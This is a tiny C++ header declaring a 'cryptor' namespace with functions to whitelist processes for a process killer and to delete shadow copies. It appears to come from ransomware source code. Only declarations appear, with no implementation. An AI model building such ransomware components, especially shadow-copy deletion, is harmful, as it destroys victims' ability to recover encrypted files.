#pragma once
#include "prockiller/prockiller.h"

namespace cryptor {

	VOID SetWhiteListProcess(process_killer::PPID_LIST PidList);
	VOID DeleteShadowCopies(INT Flags);

}
